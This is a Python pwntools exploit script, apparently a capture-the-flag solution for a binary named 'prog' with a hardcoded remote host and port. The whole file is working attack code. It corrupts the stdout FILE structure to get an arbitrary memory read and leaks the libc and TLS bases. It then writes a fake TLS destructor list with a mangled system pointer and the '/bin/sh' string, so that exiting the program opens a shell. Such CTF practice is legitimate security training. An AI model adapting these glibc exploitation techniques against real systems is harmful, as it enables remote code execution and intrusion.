#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
#context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=-1', '--geometry=128x98+2900+0', '-e']
context.terminal = ['alacritty', '--title=GDB-Pwn','-o', 'window.dimensions.lines=76', '-o', 'window.dimensions.columns=150', '-o', 'window.position.x=2800', '-o', 'window.position.y=0','-o','font.size=8.0','-e']
#context.terminal = ["tmux", "splitw", "-h"]
context.log_level = 'debug'

# change -l0 to -l1 for more gadgets
def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l1', filename]).decode().split(' ')]
#onegadgets = one_gadget('libc.so.6', libc.address)

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)

exe = ELF('./prog')
libc = ELF('./libc.so.6')
#rop = ROP(exe)

host, port = "206.189.113.236", "30674"

if args.REMOTE:
  p = remote(host,port)
else:
  if args.GDB:
    p = gdb.debug([exe.path], gdbscript = '''
    source ~/gdb.plugins/gef.bata24.git/gef.py
    gef config context.show_opcodes_size 9
    si
    directory /usr/src/glibc/glibc-2.38
    b main
    c
    b *__call_tls_dtors
    c
     ''', api=True)
  else:
    p = process(exe.path)


def write(addr, data):
  sla('choice> ', '1')
  sla('> ', str(addr))
  sla('size> ', str(len(data))+'\x00')
  sa('data> ', data)

# stdout read primitive
def readmem(stdout_addr, addr, size, returned=0):
  temp = p64(0xfbad1887) + p64(0)*3 + p64(addr) + p64(addr + size)*3 + p64(addr + size +1)
  write(stdout_addr, temp)
  if returned:
    return p.read(size)

stdout = int(rcu('leak: ','\n'),16)
libc.address = stdout-libc.sym['_IO_2_1_stdout_']
logbase()

# leak tls base
tls = u64(readmem(stdout,  libc.address+0x1ff898, 8, 1)) - 0x3c000
logleak('tls base', tls)
target = tls + 0x6f0
logleak('tls target', target)
system = (libc.sym['system'])<<17

# write fake dtor_list & overwrite canary & PTR_MANGLE
fake_dtor_list =  p64(target+8)
fake_dtor_list += p64(system)
fake_dtor_list += p64(next(libc.search(b'/bin/sh')))
fake_dtor_list += p64(0)*7
fake_dtor_list += p64(target+0x50)+p64(target+0x50+0x9a0)+p64(target+0x50)
fake_dtor_list += p64(0)*4
# overwrite tls dtor_list
write(target, fake_dtor_list)
# exit to shell
sla('choice> ', '2')

p.interactive()

